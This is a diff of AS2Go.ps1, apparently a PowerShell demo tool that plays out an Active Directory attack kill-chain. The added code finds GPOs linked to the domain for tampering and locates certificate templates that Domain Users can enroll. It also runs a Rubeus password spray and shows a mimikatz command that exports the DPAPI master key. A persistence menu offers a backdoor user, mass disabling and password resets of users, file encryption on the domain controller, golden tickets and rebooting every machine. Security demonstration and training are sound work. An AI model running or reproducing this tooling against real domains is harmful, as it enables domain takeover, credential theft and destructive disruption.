+    Write-Log -Message "    >> using GPO Report $htmlfile "
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+    # return $true
+}
+  
+function Get-GPOSettings {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####    Export GPO Settings in HTML File and open the file                #####                          
+    #####                                                                      #####
+    ################################################################################
+
+
+    Param([string] $ID, [string] $postfix, [String] $name)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    if (Get-Module -ListAvailable -Name GroupPolicy) {
+
+
+        $htmlfile = ".\GP-$ID-$postfix.html"
+        $gporeport = Get-GPOReport -Guid $id -ReportType Html
+        Set-Content -Value $gporeport -Path $htmlfile
+        Invoke-Item $htmlfile 
+
+        Write-host "`nSaved the selected GPO " -NoNewline
+        Write-host "$name " -NoNewline -ForegroundColor Yellow
+        Write-Host " settings to file $htmlfile."
+
+        Write-Log -Message "    >> using GPO Report $htmlfile "
+        #endregion ####################### main code #########################
+        Write-Log -Message "### End Function $myfunction ###"
+    }
+    else {
+       Write-Host "`n   WARNING: To display the Group Policy Settings the GroupPolicy module is required!`n" -ForegroundColor $global:FGCError
+    }
+    # return $true
+}
+function Get-GPOLinkedOnDomain {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####    List all GPO which Linked directly on the Domain                  #####                                 
+    #####                                                                      #####
+    ################################################################################
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    $LinkedGPOs = New-Object System.Collections.ArrayList
+    $domain = (Get-ADDomain).DistinguishedName
+    $results = (Get-ADObject -Filter { ObjectClass -eq "domainDNS" } -Properties * -SearchBase $domain -SearchScope Base | Select-Object name, gplink)
+
+    [int]$i = 0
+    [string]$result = ""
+
+    Foreach ($result in $results.gplink.Split(']')) {
+
+        [int]$start = $result.IndexOf('{') + 1
+        [int]$end = $result.IndexOf('}') - $start
+
+        If ($end -eq -1) { break }
+
+        $id = $result.Substring($start, $end) 
+        $gpos = (Get-GPO -Guid $id | Select-Object  Id, DisplayName, GpoStatus, Description, ModificationTime, Owner)
+
+        $items = @{
+            Number           = $i
+            DisplayName      = $gpos.DisplayName
+            GpoStatus        = $gpos.GpoStatus
+            Description      = $gpos.Description
+            ID               = $gpos.Id
+            Owner            = $gpos.Owner
+            ModificationTime = $gpos.ModificationTime
+        }
+                    
+        $LinkedGPOs.add((New-Object psobject -Property $items)) | Out-Null
+        $i++
+    }
+
+    $i = $LinkedGPOs.Count
+    Clear-Host
+    Write-Host "____________________________________________________________________`n" 
+    Write-Host "       GPT Manipulation - Choose a Group Policy                     "
+    Write-Host "____________________________________________________________________`n" 
+    Write-host""
+    Write-host "Found $i Group Policies that linked directly on Domain " -NoNewline | Out-Host
+    Write-Host $domain -ForegroundColor Yellow | Out-Host
+    $LinkedGPOs | Sort-Object Number | Select-Object Number, Displayname, ID, GPOStatus, Description, Owner, ModificationTime | Format-Table | Out-Host
+
+    $i-=1
+
+    do {
+        do { 
+        
+            #$gpo = Read-Host "Type in the NUMBER of your preferred Group Policy, e.g. 0"
+
+            $question = "Type in the NUMBER of your preferred Group Policy, e.g. 0? Default "
+            $gpo = Get-Answer -question $question -defaultValue 0
+
+            if ($gpo -match "\b[0-$i]\b") {
+                $repeat = $no
+            }
+            else{
+                $repeat = $yes
+                Write-Host $gpo -NoNewline -ForegroundColor Yellow
+                Write-Host " is out of scope!"
+            }
+
+        } Until ($repeat -eq $no)
+
+        Get-GPOSettings -ID $LinkedGPOs[[int]$gpo].ID -Name $LinkedGPOs[[int]$gpo].DisplayName -postfix 'before'
+
+        $question = "Do you need to REPEAT this step - Y or N? Default "
+        $repeat = Get-Answer -question $question -defaultValue $no
+    
+    } Until ($repeat -eq $no)
+
+    Write-Log -Message "    >> using GPO $id"
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+    return $LinkedGPOs[[int]$gpo].ID, $LinkedGPOs[[int]$gpo].DisplayName
+}
+
 
 #region AS2Go Functions
 
@@ -591,31 +1447,43 @@ function Access-Directory {
 
 function Confirm-PoSHModuleAvailabliy {
 
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $PSModule
-    )
+    Param([string]$PSModule)
 
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
     #####
 
-    Import-Module $PSModule -ErrorAction SilentlyContinue
-
-    If ($null -eq (Get-Module $PSModule)) {
+If ($PSModule -eq "GroupPolicy"){
+    If ($null -eq (Get-Module -ListAvailable -Name $PSModule)) {
+        Write-Host ""
+        Write-Warning "The PowerShell '$PSModule' Module is missing!!"
+        Write-host    "`nPlease install the PowerShell $PSModule Module To display the Group Policy Settings." 
+        Write-Host ""
+        Write-Log -Message "The PowerShell '$PSModule' Module is missing!!"
+        pause
+    }
+    else {
+        Import-Module GroupPolicy
+    }
+}
+elseif ($PSModule -eq "ActiveDirectory") {
+    If ($null -eq (Get-Module -ListAvailable -Name $PSModule)) {
         Write-Host ""
         Write-Warning "The PowerShell '$PSModule' Module is missing!!"
         Write-host    "`nPlease install the PowerShell $PSModule Module" 
         Write-host    "e.g. https://theitbros.com/install-and-import-powershell-active-directory-module"
         Write-Host ""
         Write-Log -Message "The PowerShell '$PSModule' Module is missing!!"
-        Pause
+        EXIT
     }
-    else {
+}
+else {
+    <# Action when all if and elseif conditions are false #>
+}
 
-    }
+
+
+
 
     #####
     Write-Log -Message "### End Function $myfunction ###"
@@ -1299,19 +2167,28 @@ function Get-RiskyEnrolledTemplates {
         Write-Host $_
     }
 
-
     foreach ($PkiEnrollment in $pKIEnrollmentService) {
     
         for ($i = 0; $i -lt $PkiEnrollment.certificatetemplates.count; $i++) {
-            [void]$PublishedPKITemplates.Add($PkiEnrollment.certificatetemplates[$i])       
+
+            #[void]$PublishedPKITemplates.Add($PkiEnrollment.certificatetemplates[$i]) 
+
+            $items = @{
+                TemplateName    = $PkiEnrollment.certificatetemplates[$i]
+                CAName          = $PkiEnrollment.Name
+                DNSHostName     = $PkiEnrollment.DNShostname
+            }
+        
+            $PublishedPKITemplates.add((New-Object psobject -Property $items)) | Out-Null
+
         }
     }
 
-    #$PublishedRiskyTemplates = ""
 
     if ($PublishedPKITemplates) {
-        # For each template name searc for the object
-        Foreach ($PublishedTemplate in @($PublishedPKITemplates)) {
+        # For each template name search for the object
+        Foreach ($result in $PublishedPKITemplates) {
+            $PublishedTemplate = $result.TemplateName
             $SearchFilter = "(&(objectClass=pKICertificateTemplate)(cn=$PublishedTemplate)(msPKI-Certificate-Name-Flag=1)(msPKI-Certificate-Application-Policy=1.3.6.1.5.5.7.3.2))"
             $RiskyTemplate = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$forest" -LDAPFilter $SearchFilter -SearchScope OneLevel
             if ($RiskyTemplate) {
@@ -1323,14 +2200,12 @@ function Get-RiskyEnrolledTemplates {
                         DN             = $RiskyTemplate.DistinguishedName
                         ObjectGUID     = $RiskyTemplate.ObjectGUID
                         objectClass    = $RiskyTemplate.ObjectClass
+                        EnrollmentCA   = $result.DNSHostName + "\" + $result.CAName  
                         CanPublishedBy = "n/a"
                     }
                     
                     $PublishedRiskyTemplates.add((New-Object psobject -Property $items)) | Out-Null
                 }
-
-
-
             }
         }
     }
@@ -1384,10 +2259,12 @@ function Get-VulnerableCertificateTemplate {
         #find vulnerable CA templates
 
         Foreach ($result in $PublishedRiskyTemplates) {
-
             Write-host "`n`nFound vulnerable template " -NoNewline
             Write-host "$($result.Name)" -ForegroundColor Yellow -NoNewline
-            Write-host ", which can be enrolled by:`n"
+            Write-host " on " -NoNewline
+            Write-Host $result.EnrollmentCA -ForegroundColor Yellow -NoNewline
+            Write-Host ", which can be enrolled by:`n"
+            
 
             $DSobject = [adsi]("LDAP://$($result.DN)")
             $secd = $DSobject.psbase.get_objectSecurity().getAccessRules($true, $chkInheritedPerm.checked, [System.Security.Principal.NTAccount])
@@ -1398,13 +2275,14 @@ function Get-VulnerableCertificateTemplate {
 
                 If ($t.Contains("Domain Users") -or $t.Contains("Everyone") -or $t.Contains("Authenticated Users")) {
                     write-host ("   - $t").PadRight(45, [Char]32) -ForegroundColor Yellow -NoNewline
-                    Write-Host "<< Bingo!"
+                    Write-Host "<< Bingo!" -ForegroundColor Green
                     $CAtemplate = $result.Name
+                    $CAEnrollment = $result.EnrollmentCA
 
                 }
                 elseif ($t.Contains("Domain Computers") ) {
                     write-host ("   - $t").PadRight(45, [Char]32) -ForegroundColor Yellow -NoNewline
-                    Write-Host "<< Bingo!"
+                    Write-Host "<< Bingo!" -ForegroundColor Green
                     [string]$temp = ($temp + ' - ' + $($result.Name).ToUpper())
                 }
                 else {
@@ -1419,6 +2297,8 @@ function Get-VulnerableCertificateTemplate {
         $question = "Do you want to use CA template '$CAtemplate' - Y or N? Default "
         $prompt = Get-Answer -question $question -defaultValue $yes
 
+
+
         if ($prompt -ne $yes) {
             write-host ""
             [int]$i = 0
@@ -1428,12 +2308,31 @@ function Get-VulnerableCertificateTemplate {
                 Write-host "] - $($ca.name)"
                 $i++
             }
-write-host ""
-            $i = Get-Random -Minimum 0 -Maximum $i
-            $i = Read-Host "Type in the NUMBER for your preferred CA Template, e.g. $i"
-            $CAtemplate = $PublishedRiskyTemplates.name[$i]
+            write-host ""
+        $max = $i -1
+        $i = Get-Random -Minimum 0 -Maximum $max
+            do { 
+
+                $n = Read-Host "Type in the NUMBER for your preferred CA Template, e.g. $i"
+                if ($n -match "\b[0-$max]\b") {
+                    $repeat = $no
+                }
+                else {
+                    $repeat = $yes
+                    Write-Host $n -NoNewline -ForegroundColor Yellow
+                    Write-Host " is out of scope!"
+                }
+            } Until ($repeat -eq $no)
+            
+            $CAtemplate = $PublishedRiskyTemplates.name[$n]
+            $CAEnrollment = $PublishedRiskyTemplates.EnrollmentCA[$n]
+      
+      
             Set-KeyValue -key "BadCA" -NewValue $CAtemplate
             write-host ""
+            
+
+      
         }
     } Until ($prompt -eq $yes)
     
@@ -1450,7 +2349,7 @@ write-host ""
     #endregion ####################### main code #########################
     Write-Log -Message "### End Function $myfunction ###"
 
-    return $CAtemplate, $UseDomainComputers  
+    return $CAtemplate, $UseDomainComputers, $CAEnrollment  
 }
 
 function Get-VulnerableCertificateTemplate_old {
@@ -1705,7 +2604,7 @@ function New-AuthenticationCertificatesAttack {
 
     Update-WindowTitle -NewTitle $stage25
     Set-KeyValue -key "LastStage" -NewValue $stage25
-    If ($showStep) { Show-Step -step "step_007.html" }
+   # If ($showStep) { Show-Step -step "step_007.html" }
     Do {
         Clear-Host
         Write-Host "____________________________________________________________________`n" 
@@ -1748,7 +2647,7 @@ function New-AuthenticationCertificatesAttack {
 
                 #$EnterpriseCA = Get-EnterpriseCAName
 
-                $EnterpriseCA = Get-EnrollmentService
+        #        $EnterpriseCA = Get-EnrollmentService
 
 
                 Clear-Host
@@ -1758,8 +2657,9 @@ function New-AuthenticationCertificatesAttack {
                 Write-Host "____________________________________________________________________`n" 
 
                 # End "Do ... Until" Loop?
-                $question = "Do you need to REPEAT this attack level - Y or N? Default "
-                $repeat = Get-Answer -question $question -defaultValue $no
+                #$question = "Do you need to REPEAT this attack level - Y or N? Default "
+                #$repeat = Get-Answer -question $question -defaultValue $no
+                $repeat = $no
 
             } Until ($repeat -eq $no)
 
@@ -1774,11 +2674,15 @@ function New-AuthenticationCertificatesAttack {
 
             $CATemplateInfo = Get-VulnerableCertificateTemplate -myEntCA $EnterpriseCA
 
-            $CAtemplate = $CATemplateInfo[0]
-
             #Write-Output $CATemplateInfo[0]
-            #Write-Host $CATemplateInfo[1]
-            #pause
+           # Write-Host $CATemplateInfo[1]
+            #Write-Host $CATemplateInfo[2]
+           # pause
+
+            $CAtemplate = $CATemplateInfo[0]
+            $EnterpriseCA = $CATemplateInfo[2]
+
+
 
             #endregion Step 2 - Finding an Vulnerable Certificate Templates
 
@@ -2371,40 +3275,40 @@ function New-PasswordSprayAttack {
 
 
     If ($SkipPwSpayWithRubeus -ne $true) {
-        $prompt = $yes
-    }
-    else {
+
         $question = "Do you also want to run a Password Spray attack with rubues.exe - Y or N? Default "
         $prompt = Get-Answer -question $question -defaultValue $no
+
+        if ($prompt -eq $yes) {
+
+            If ($SkipPwSpayWithRubeus -ne $true) {
+                $prompt = $yes
+            }
+            else {
+                $question = "Do you like to use this password '$MyPW03' for the spray with Rubeus - Y or N? Default "
+                $prompt = Get-Answer -question $question -defaultValue $yes
+            }
+    
+    
+    
+            if ($prompt -ne $yes) {
+                $MyPW03 = Read-Host "Enter new password"
+            }
+            Write-Host ""
+            Write-Host      -NoNewline "  Command: "
+            Write-Highlight -Text " .\Rubeus.exe ", "brute /password:", $MyPW03, " /noticket" `
+                -Color $fgcC, $fgcS, $fgcV, $fgcS
+            Write-Host ""
+    
+            Write-Log -Message ".\Rubeus.exe brute /password:$MyPW03 /noticket"
+            If ($UnAttended) { Start-Sleep 2 } else { Pause }
+    
+            Invoke-Command -ScriptBlock { .\Rubeus.exe brute /password:$MyPW03 /noticket }
+        }
     }
 
 
-    if ($prompt -eq $yes) {
 
-        If ($SkipPwSpayWithRubeus -ne $true) {
-            $prompt = $yes
-        }
-        else {
-            $question = "Do you like to use this password '$MyPW03' for the spray with Rubeus - Y or N? Default "
-            $prompt = Get-Answer -question $question -defaultValue $yes
-        }
-
-
-
-        if ($prompt -ne $yes) {
-            $MyPW03 = Read-Host "Enter new password"
-        }
-        Write-Host ""
-        Write-Host      -NoNewline "  Command: "
-        Write-Highlight -Text " .\Rubeus.exe ", "brute /password:", $MyPW03, " /noticket" `
-            -Color $fgcC, $fgcS, $fgcV, $fgcS
-        Write-Host ""
-
-        Write-Log -Message ".\Rubeus.exe brute /password:$MyPW03 /noticket"
-        If ($UnAttended) { Start-Sleep 2 } else { Pause }
-
-        Invoke-Command -ScriptBlock { .\Rubeus.exe brute /password:$MyPW03 /noticket }
-    }
    
 
 
@@ -2463,7 +3367,7 @@ Function New-KeyValue {
 
     # Add the new element to the root element
     $root = $AS2GoConfig.SelectSingleNode("//DefaultParameter")
-    $root.AppendChild($Setting)
+    $root.AppendChild($Setting) | Out-Host
 
     # Save the modified XML document
     $AS2GoConfig.Save($configFile)
@@ -2502,7 +3406,7 @@ function New-PrivilegeEscalationRecommendation {
     Write-Host "____________________________________________________________________`n" 
 
 
-    Write-Host "     ... please be patient, while cheching your environment ... " -ForegroundColor Yellow
+    Write-Host "     ... please be patient, while checking your environment ... " -ForegroundColor Yellow
 
     $overview = Get-ComputerInformation -computer $computer
     $temp = $overview.Replace("        ", " ")
@@ -2606,11 +3510,11 @@ function New-PrivilegeEscalationRecommendation {
     Write-Host "$space  ═════════╬══════════════════════════════════════════"
     Write-Host "$space   PtH     ║    OK    |    OK*   |    OK*   |    --    Pass-the-Hash Attack"  -ForegroundColor Yellow
     Write-Host "$space   PtT     ║    OK    |    OK    |    OK    |    OK    Pass-the-Ticket Attack"  -ForegroundColor Gray
-    Write-Host "$space   PtC     ║    --    |    OK    |    OK    |    OK    Abuse misconfigured Certificate Templates "  -ForegroundColor Yellow
+    Write-Host "$space   PtC     ║    --    |    OK    |    OK    |    OK    Abuse misconfigured Certificate Template "  -ForegroundColor Yellow
     Write-Host "$space   WDigest ║    OK    |    OK    |    OK    |    --    Credential Theft through Memory Access"  -ForegroundColor Gray
     Write-Host "$space   SPN     ║    OK    |    OK    |    OK    |    OK    Kerberoasting Attack"  -ForegroundColor Yellow
     Write-Host "" 
-    Write-Host "   * CIFS on remote Admin PC will work, but LDAP authentication will fail."
+    Write-Host "   * CIFS on remote Admin PC works, but LDAP authentication will fail."
     Write-Host "     Pass-the-Ticket attack is therefore possible!" -ForegroundColor Yellow
 
     Write-Host ""
@@ -2749,8 +3653,8 @@ function New-PrivilegeEscalationRecommendation {
 
     If ($AdminWithSPN) {
         Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
-        Write-Host "Found at least one Administrator with " -NoNewline
-        Write-Host "Service Principal Names (SPNs)!" -ForegroundColor Yellow
+        Write-Host "Found at least one tier 0 account with an " -NoNewline
+        Write-Host "Service Principal Name (SPN)!" -ForegroundColor Yellow
     }
     
 
@@ -3580,8 +4484,16 @@ function Start-Reconnaissance {
 
 
     Write-Host ""
-    $directory = "\\$mySAW\c$"
-    Get-DirContent -Path $directory
+
+    [bool]$result = Test-Connection -ComputerName $mySAW -Quiet -Count 1 -ErrorAction SilentlyContinue
+    If ($result -eq $true) {
+        $directory = "\\$mySAW\c$"
+        Get-DirContent -Path $directory
+    }
+    else {
+        Write-Host "Admin PC $mySAW is offline!" -ForegroundColor Red
+    }
+
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
     Clear-Host
@@ -4342,6 +5254,8 @@ Function Start-AS2GoDemo {
 
     Confirm-PoSHModuleAvailabliy -PSModule "ActiveDirectory"
     Import-Module ActiveDirectory
+    Confirm-PoSHModuleAvailabliy -PSModule "GroupPolicy"
+
 
     $demo = Get-KeyValue -key "DemoTitle"
     Update-WindowTitle -NewTitle $demo
@@ -4379,13 +5293,13 @@ Function Start-AS2GoDemo {
         Write-Host "____________________________________________________________________`n" 
         Write-Host "        AS2Go.ps1   Version $version              "
         Write-Host "                                                                    "
-        Write-Host "        Attack scenario to GO | along the kill-chain                " -ForegroundColor yellow
+        Write-Host "        Attack Scenario to Go | along the kill-chain                " -ForegroundColor yellow
         Write-Host "                                                                    "
         Write-Host "        created by Holger Zimmermann | last update $lastupdate      "
         Write-Host "                                                                    "
         Write-Host "        Used tools & requirements:                                  "
         Write-Host "                                                                    "
-        Write-Host "        ●  ACTIVE DIRECTORY PoSH module                             "
+        Write-Host "        ●  PoSH modules: ActiveDirectory & GroupPolicy              "
         Write-Host "                                                                    "
         Write-Host "        ●  NetSess.exe    $FileVersionN                             "
         Write-Host "        ●  Mimikatz.exe   $FileVersionM                             "
@@ -4883,7 +5797,7 @@ Function Start-AS2GoDemo {
 
     ################################################################################
     ######                                                                     #####
-    ######                Attack Level - Privilege Escalation                      #####
+    ######                Attack Level - Privilege Escalation                  #####
     ######                                                                     #####
     ################################################################################
 
@@ -4908,7 +5822,7 @@ Function Start-AS2GoDemo {
             $PrivilegeEscalation = New-PrivilegeEscalationRecommendation -computer $env:COMPUTERNAME
 
             Write-Host "____________________________________________________________________`n" 
-            Write-Host "       Privilege Escalation - choose your attack                             "
+            Write-Host "       Privilege Escalation - Choose your Attack                             "
             Write-Host "____________________________________________________________________`n" 
             Write-Host "     - for a Pass-the-Hash Attack enter:                                 " -NoNewline; Write-Host "H"-ForegroundColor Yellow
             Write-Host "     - for a Pass-the-Ticket Attack enter:                               " -NoNewline; Write-Host "T"-ForegroundColor Yellow
@@ -4923,7 +5837,7 @@ Function Start-AS2GoDemo {
                 $answer = $PrivilegeEscalation
             }
             else {
-                $question = "Enter your choice or enter [S] to skip this Step! Default "
+                $question = "Enter your choice or enter [S] to skip this step! Default "
                 $answer = Get-Answer -question $question -defaultValue $PrivilegeEscalation
             }
 
@@ -4937,27 +5851,27 @@ Function Start-AS2GoDemo {
                 Start-PtTAttack
             }
             elseif ($answer -eq $PtC ) {
-                If ($showStep) { Show-Step -step step_007_PtT.html } 
+               # If ($showStep) { Show-Step -step step_007_PtT.html } 
                 New-AuthenticationCertificatesAttack
             }
             elseif ($answer -eq $KrA) {
-                If ($showStep) { Show-Step -step step_007_PtT.html } 
+                #If ($showStep) { Show-Step -step step_007_PtT.html } 
                 New-KerberoastingAttack
             }
             elseif ($answer -eq $CfM) {
-                If ($showStep) { Show-Step -step step_007_PtT.html } 
+                #If ($showStep) { Show-Step -step step_007_PtT.html } 
                 New-CredentialTheftThroughMemoryAccess
             }
 
             elseif ($answer -eq "E") {
-                If ($showStep) { Show-Step -step step_007_PtT.html } 
+                #If ($showStep) { Show-Step -step step_007_PtT.html } 
                 Set-UseLogonCredential
             }
 
           
 
             elseif ($answer -eq "X") {
-                If ($showStep) { Show-Step -step step_007_PtT.html } 
+             #   If ($showStep) { Show-Step -step step_007_PtT.html } 
                 New-PrivilegesEscalationtoSystem
             }
 
@@ -4988,44 +5902,114 @@ Function Start-AS2GoDemo {
 
     #endregion Attack Level - Privilege Escalation
 
+
     ################################################################################
     ######                                                                     #####
-    ######      Attack Level - Steal or Forge Authentication Certificates      #####
+    ######                Attack Level - RECONNAISSANCE                        #####
     ######                                                                     #####
     ################################################################################
 
-    #region Attack Level - Forge Authentication Certificates
+    #region Attack Level - RECONNAISSANCE
+    If ($SkipReconnaissance) {
+        Write-Log -Message "Skipped Attack Level - RECONNAISSANCE"
+    }
+    else {
     
-    If ($SkipForgeAuthCertificates) {
-        Write-Log -Message "Skipped Attack Level - Steal or Forge Authentication Certificates "
+        Update-WindowTitle -NewTitle $stage10
+        #Set-KeyValue -key "LastStage" -NewValue $stage10
+        If ($showStep) { Show-Step -step "step_006.html" }
+        Do {
+            # If ($skipstep) { break }     
+            Clear-Host
+            Write-Host "____________________________________________________________________`n" 
+            Write-Host "                   Attack Level - RECONNAISSANCE                    "
+            Write-Host "       try to collect reconnaissance and configuration data         "
+            Write-Host "____________________________________________________________________`n" 
+    
+            If ($UnAttended) {
+                $answer = $yes
+            }
+            else {
+                $question = "Do you want to run this step - Y or N? Default "
+                $answer = Get-Answer -question $question -defaultValue $Yes
+            }
+    
+            If ($answer -eq $yes) {
+        
+                Clear-Host
+                Write-Host "____________________________________________________________________`n" 
+                Write-Host "        Show Services and Processes on Logon Server                  "
+                Write-Host "____________________________________________________________________`n"
+                
+                
+                $server = $env:LOGONSERVER.replace("\","")
+
+                Write-Host      -NoNewline "  Commands: "
+                Write-Highlight -Text " Get-Service ", "-ComputerName ", "$server ", "| " , "Out-GridView ", "-Title " , "Services  on $server"`
+                                -Color $fgcC, $fgcS, $fgcV, $fgcF, $fgcC, $fgcS, $fgcV
+
+                Write-Host      -NoNewline "            " 
+                Write-Highlight -Text " Get-Process ", "-ComputerName ", "$server ", "| " , "Out-GridView ", "-Title " , "Processes on $server"`
+                                -Color $fgcC, $fgcS, $fgcV, $fgcF, $fgcC, $fgcS, $fgcV 
+                Write-Host ""
+
+
+                If ($UnAttended) {
+                    $answer = $no 
+                }
+                else {
+                    $question = "Do you want to run these steps - Y or N? Default "
+                    $answer = Get-Answer -question $question -defaultValue $Yes
+                }
+
+                If ($answer -eq $yes) {
+
+                    Get-Service -ComputerName $server | Sort-Object status | Out-GridView -Title "Services on $server" 
+                    Get-Process -ComputerName $server | Out-GridView -Title "Processes on $server"
+                } 
+    
+    
+                If ($UnAttended) {
+                    $answer = $reconnaissance
+                }
+                else {
+                    $question = "Further reconnaissance tasks - Y or N? Default "
+                    $answer = Get-Answer -question $question -defaultValue $yes
+                }
+    
+                If ($answer -eq $yes) {
+                    Start-ReconnaissanceExtended
+                }
+            }
+            elseIf ($answer -eq $exit) {
+                Stop-AS2GoDemo
+            }
+            else {
+            }
+    
+    
+            Clear-Host
+    
+            Write-Host "____________________________________________________________________`n" 
+            Write-Host "        ??? REPEAT | Attack Level - RECONNAISSANCE  ???             "
+            Write-Host "____________________________________________________________________`n" 
+    
+            If ($UnAttended) {
+                $repeat = $no
+            }
+            else {
+                $question = "Do you need to REPEAT this attack level - Y or N? Default "
+                $repeat = Get-Answer -question $question -defaultValue $no
+            }
+    
+       
+        } Until ($repeat -eq $no)   
     }
-    else {
-
-    }
-
-    #endregion Attack Level - Forge Authentication Certificates
-
-
-    ################################################################################
-    ######                                                                     #####
-    ######                Attack Level -  Kerberoasting Attack                 #####
-    ######                                                                     ##### 
-    ######     technique used by attackers, which allows them to request       #####
-    ######     a service ticket for any service with a registered SPN          #####
-    ######                                                                     #####
-    ################################################################################
-
-    #region Attack Level -  Kerberoasting Attack
-
-    If ($SkipKerberoastingAttack) {
-        Write-Log -Message "Skipped Attack Level - Kerberoasting Attack"
-    }
-    else {
 
 
 
-    }
-    #endregion Attack Level -  Kerberoasting Attack
+    #endregion Attack Level RECONNAISSANCE
+
 
 
     ################################################################################
@@ -5102,170 +6086,271 @@ Function Start-AS2GoDemo {
         Update-WindowTitle -NewTitle $stage40
         Set-KeyValue -key "LastStage" -NewValue $stage40
         If ($showStep) { Show-Step step_012.html }
+        $NextStep = "B"
+        
         Do {
+
+
+            Set-NewColorSchema -NewStage $InitialStart
             Clear-Host
             Write-Host "____________________________________________________________________`n" 
             Write-Host "          Attack Level - DOMAIN COMPROMISED AND PERSISTENCE         "
             Write-Host "____________________________________________________________________`n" 
-            Write-Host "               Step #1 - create a backdoor user"
-            Write-Host "               Step #2 - export DPAPI master key"
-            Write-Host "               Step #3 - PW reset and disable users"
-            Write-Host "               Step #4 - Encrypt files"
-            Write-Host "               Step #5 - create golden ticket"
-            Write-Host "               Step #6 - reboot (all machines)"  
+            
+            Write-Host "   Choose your attack: `n"
+
+          #  Write-Host "   S " -ForegroundColor Yellow -NoNewline; Write-Host "- to show Services and Processes on Logon Server`n"  
+            Write-Host "   B " -ForegroundColor Yellow -NoNewline; Write-Host "- to create a backdoor user"
+            Write-Host "   T " -ForegroundColor Yellow -NoNewline; Write-Host "- to manipulate Group Policy Templates (GPT) files" -NoNewline; Write-Host "   **** NEW ****" -ForegroundColor Yellow
+            Write-Host "   D " -ForegroundColor Yellow -NoNewline; Write-Host "- to disable all users, except for the backdoor user"
+            Write-Host "     " -ForegroundColor Yellow -NoNewline; Write-Host "  (and reset all user passwords, except for the backdoor user)"
+            Write-Host "   E " -ForegroundColor Yellow -NoNewline; Write-Host "- to encrypt (backup) files on Domain Controller"
+            Write-Host "   K " -ForegroundColor Yellow -NoNewline; Write-Host "- to export the DPAPI master key"
+            Write-Host "   G " -ForegroundColor Yellow -NoNewline; Write-Host "- to create a golden ticket"
+            Write-Host "   R " -ForegroundColor Yellow -NoNewline; Write-Host "- to reboot all (available) machines"  
+            Write-Host "`n   X " -ForegroundColor Yellow -NoNewline; Write-Host "- to Exit AS2Go"  
 
             If ($UnAttended) {
                 $answer = $yes 
             }
             else {
-                $question = "Do you want to run these steps - Y or N? Default "
-                $answer = Get-Answer -question $question -defaultValue $Yes
+                $question = "Enter or confirm your attack here! Default "
+                $answer = Get-Answer -question $question -defaultValue $NextStep
             }
 
-            If ($answer -eq $yes) {
-                Clear-Host
 
+            switch ($answer) {
+
+                "B" {
+                    Clear-Host
+                    Write-Host "____________________________________________________________________`n" 
+                    Write-Host "        Create a backdoor USER and add it to Sensitive Groups           "
+                    Write-Host "____________________________________________________________________`n"     
+        
+                    If ($UnAttended) {
+                        $answer = $yes 
+                    }
+                    else {
+                        $question = "Do you want to run these steps - Y or N? Default "
+                        $answer = Get-Answer -question $question -defaultValue $Yes
+                    }
     
-
-                Write-Host "____________________________________________________________________`n" 
-                Write-Host "        Create a backdoor USER and add it to Sensitive Groups           "
-                Write-Host "____________________________________________________________________`n"     
+                    If ($answer -eq $yes) {
+                        New-BackDoorUser
+                        If ($UnAttended) { Start-Sleep 2 } else { Pause }
+                    }
+                    $NextStep = "T"
+                    $repeat = $yes 
+                }
+                "T" {
+                    Clear-Host
+                    Write-Host "____________________________________________________________________`n" 
+                    Write-Host "        Manipulate Group Policy Templates (GPT) files           "
+                    Write-Host "____________________________________________________________________`n"     
+        
+                    If ($UnAttended) {
+                        $answer = $yes 
+                    }
+                    else {
+                        $question = "Do you want to run these steps - Y or N? Default "
+                        $answer = Get-Answer -question $question -defaultValue $Yes
+                    }
     
-                If ($UnAttended) {
-                    $answer = $yes 
-                }
-                else {
-                    $question = "Do you want to run these steps - Y or N? Default "
-                    $answer = Get-Answer -question $question -defaultValue $Yes
-                }
+                    If ($answer -eq $yes) {
+                        #   New-BackDoorUser
+                        $GPODetails = Get-GPOLinkedOnDomain
+                       # write-host $GPODetails[0] | Out-Host
+                       # write-host $GPODetails[1] | Out-Host
+                        New-GPOManipulation -ID $GPODetails[0] -name $GPODetails[1]
 
-                If ($answer -eq $yes) {
-                    New-BackDoorUser
-                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
-                } 
+                      #  If ($UnAttended) { Start-Sleep 2 } else { Pause }
+                    }
+                    $NextStep = "D"
+                    $repeat = $yes  
+                }
+                "D" {
+                    Clear-Host
+                    Write-Host "____________________________________________________________________`n" 
+                    Write-Host "            User Manipulation - Disable & PW reset                   "
+                    Write-Host "____________________________________________________________________`n" 
+      
+                    $EmojiIcon = [System.Convert]::toInt32("1F600", 16)
+                    $Smily = [System.Char]::ConvertFromUtf32($EmojiIcon)
     
-                #Pause
-                Clear-Host
-                Write-Host "____________________________________________________________________`n" 
-                Write-Host "        try to export DATA PROTECTION API master key                "
-                Write-Host ""
-                write-host "    Attackers can use the master key to decrypt ANY secret "         
-                Write-Host "        protected by DPAPI on all domain-joined machines"
-                Write-Host "____________________________________________________________________`n"     
-                write-host ""
-                Write-Host      -NoNewline "  Command: "
-                Write-Highlight -Text ".\mimikatz.exe ", """cd $exfiltration"" ", """privilege::", "debug", """ ""lsadump::", "backupkeys ", "/system:", "$mydc.$fqdn", " /export", """ ""exit"""  `
-                    -Color $fgcC, $fgcV, $fgcF, $fgcV, $fgcF, $fgcV, $fgcS, $fgcV, $fgcS, $fgcF
-                Write-Host  ""
-
-                If ($UnAttended) {
-                    $answer = $yes 
+        
+                    Write-host "  ... will ignore your new backdoor user " -NoNewline
+                    Write-host $global:BDUser -ForegroundColor $global:FGCHighLight -NoNewline
+                    Write-Host " - $Smily"
+            
+                    If ($UnAttended) {
+                        $answer = $yes 
+                    }
+                    else {
+                        $question = "Do you want to run these steps - Y or N? Default "
+                        $answer = Get-Answer -question $question -defaultValue $Yes
+                    }
+    
